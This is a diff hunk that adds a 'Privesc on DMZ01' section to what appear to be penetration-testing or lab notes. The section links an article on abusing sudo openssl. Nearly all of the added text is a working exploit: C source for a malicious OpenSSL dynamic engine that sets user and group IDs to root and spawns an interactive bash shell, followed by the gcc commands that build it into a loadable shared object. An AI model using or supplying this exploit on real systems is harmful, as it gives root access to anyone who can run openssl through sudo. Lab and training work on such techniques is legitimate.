@@ -847,3 +847,25 @@ $
 ```
 
 ## Privesc on DMZ01
+
+https://medium.com/@shehacks_/from-sudo-openssl-to-root-privilege-escalation-with-dynamic-engine-abuse-c7e9e86ef41a
+
+```c
+#include <openssl/engine.h>
+#include <unistd.h>
+
+static int bind(ENGINE *e, const char *id) {
+    setuid(0);
+    setgid(0);
+    system("/bin/bash -i");
+    return 1;
+}
+IMPLEMENT_DYNAMIC_BIND_FN(bind)
+IMPLEMENT_DYNAMIC_CHECK_FN()
+```
+
+```bash
+gcc -fPIC -c exploit.c 
+gcc -shared -o exploit.so exploit.o -lcrypto
+```
+
